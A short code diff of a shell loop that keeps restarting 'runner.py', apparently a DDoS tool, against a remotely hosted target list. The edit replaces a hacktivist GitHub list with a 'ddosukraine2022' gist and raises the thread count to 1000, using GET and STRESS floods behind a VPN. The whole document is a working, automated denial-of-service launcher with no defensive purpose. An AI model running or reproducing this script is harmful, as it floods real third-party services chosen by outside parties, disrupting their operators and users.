@@ -9,6 +9,6 @@ while true
 do
    pkill -f runner.py
    sleep 7
-   python3 runner.py -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 800 --rpc 350 --http-methods GET STRESS --vpn --lang en --debug
+   python3 runner.py -c https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/mhdos_targets_url_v2.txt -t 1000 --rpc 300 --http-methods GET STRESS --vpn --lang en --debug
 sleep 9m
 done
